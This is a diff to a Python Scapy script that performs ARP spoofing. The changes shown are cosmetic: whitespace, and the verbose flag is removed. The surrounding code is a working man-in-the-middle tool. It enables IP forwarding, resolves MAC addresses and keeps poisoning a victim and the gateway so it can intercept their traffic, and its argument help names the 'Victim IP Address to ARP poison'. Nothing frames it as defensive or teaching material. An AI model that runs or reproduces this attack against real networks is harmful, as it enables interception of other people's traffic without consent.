@@ -4,6 +4,8 @@ import time
 import os
 import sys
 
+
+
 def _enable_linux_iproute():
     file_path = "/proc/sys/net/ipv4/ip_forward"
     with open(file_path) as f:
@@ -21,7 +23,6 @@ def get_mac(ip):
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
     if ans:
         return ans[0][1].src
-        
 
 def spoof(target_ip, host_ip, verbose=True):
     target_mac = get_mac(target_ip)
@@ -44,12 +45,12 @@ if __name__ == "__main__":
     parser.add_argument("target", help="Victim IP Address to ARP poison")
     parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
     args = parser.parse_args()
-    target, host, verbose = args.target, args.host, args.verbose
+    target, host= args.target, args.host
     enable_ip_route()
     try:
         while True:
-            spoof(target, host, verbose)
-            spoof(host, target, verbose)
+            spoof(target, host)
+            spoof(host, target)
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
